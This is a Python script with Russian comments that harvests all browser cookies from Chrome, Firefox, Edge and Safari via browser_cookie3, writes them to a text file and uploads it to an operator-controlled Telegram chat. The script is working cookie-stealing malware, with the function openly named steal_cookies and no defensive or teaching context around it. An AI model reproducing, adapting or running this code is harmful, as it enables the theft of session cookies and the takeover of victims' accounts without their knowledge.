import browser_cookie3
from telegram import Bot
import asyncio


TOKEN = "ur token"

YOUR_CHAT_ID = "ur id" 

# Функция для извлечения куки из браузеров с указанием сайтов
def steal_cookies():
    cookies_by_site = {}

    # Попытка извлечь куки из Chrome
    try:
        chrome_cookies = browser_cookie3.chrome()
        for cookie in chrome_cookies:
            domain = cookie.domain
            if domain not in cookies_by_site:
                cookies_by_site[domain] = {}
            cookies_by_site[domain][cookie.name] = cookie.value
    except Exception as e:
        print(f"Ошибка при извлечении куки из Chrome: {e}")

    # Попытка извлечь куки из Firefox
    try:
        firefox_cookies = browser_cookie3.firefox()
        for cookie in firefox_cookies:
            domain = cookie.domain
            if domain not in cookies_by_site:
                cookies_by_site[domain] = {}
            cookies_by_site[domain][cookie.name] = cookie.value
    except Exception as e:
        print(f"Ошибка при извлечении куки из Firefox: {e}")

    # Попытка извлечь куки из Edge
    try:
        edge_cookies = browser_cookie3.edge()
        for cookie in edge_cookies:
            domain = cookie.domain
            if domain not in cookies_by_site:
                cookies_by_site[domain] = {}
            cookies_by_site[domain][cookie.name] = cookie.value
    except Exception as e:
        print(f"Ошибка при извлечении куки из Edge: {e}")

    # Попытка извлечь куки из Safari
    try:
        safari_cookies = browser_cookie3.safari()
        for cookie in safari_cookies:
            domain = cookie.domain
            if domain not in cookies_by_site:
                cookies_by_site[domain] = {}
            cookies_by_site[domain][cookie.name] = cookie.value
    except Exception as e:
        print(f"Ошибка при извлечении куки из Safari: {e}")

    return cookies_by_site

# Асинхронная функция для отправки куки через Telegram-бота
async def send_cookies_via_telegram(cookies_by_site):
    try:
        # Создаем объект бота
        bot = Bot(token=TOKEN)

        # Формируем содержимое файла
        file_content = "Собранные куки:\n\n"
        for domain, cookies in cookies_by_site.items():
            file_content += f"=== Сайт: {domain} ===\n"
            for name, value in cookies.items():
                file_content += f"{name}: {value}\n"
            file_content += "\n"  # Пустая строка между сайтами

        # Сохраняем куки в файл
        filename = "cookies.txt"
        with open(filename, "w", encoding="utf-8") as file:
            file.write(file_content)

        # Отправляем файл
        with open(filename, "rb") as file:
            await bot.send_document(chat_id=YOUR_CHAT_ID, document=file, caption="C00K1E")

        print("Куки успешно отправлены!")
    except Exception as e:
        print(f"Ошибка при отправке куки: {e}")

# Основная асинхронная функция
async def main():
    # Извлекаем куки
    print("Извлечение куки из браузеров...")
    cookies_by_site = steal_cookies()

    # Отправляем куки через Telegram
    print("Отправка куки через Telegram...")
    await send_cookies_via_telegram(cookies_by_site)

# Запуск асинхронного кода
if __name__ == "__main__":
    asyncio.run(main())
